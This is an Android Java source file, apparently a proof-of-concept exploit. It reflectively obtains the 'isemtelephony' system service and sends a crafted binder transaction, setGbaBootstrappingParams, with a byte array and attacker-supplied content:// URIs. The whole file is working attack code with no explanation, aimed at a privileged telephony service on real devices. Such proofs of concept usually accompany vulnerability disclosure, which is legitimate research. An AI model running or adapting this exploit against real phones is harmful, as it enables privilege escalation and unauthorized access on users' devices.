package poc.app;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

public class MainActivity extends Activity {
    static final int TRANSACTION_setGbaBootstrappingParams = 38;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            IBinder binder = getService("isemtelephony");

            Parcel parcel = Parcel.obtain();
            parcel.writeInterfaceToken(binder.getInterfaceDescriptor());
            parcel.writeInt(0);
            parcel.writeByteArray(new byte[200]);
            parcel.writeString("content://provider.test/");
            parcel.writeString("content://provider.test/");

            Parcel reply = Parcel.obtain();

            binder.transact(TRANSACTION_setGbaBootstrappingParams, parcel, reply, 0);
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }

    private IBinder getService(String name) throws Throwable {
        return (IBinder) Class.forName("android.os.ServiceManager")
                .getDeclaredMethod("getServiceOrThrow", String.class)
                .invoke(null, name);
    }
}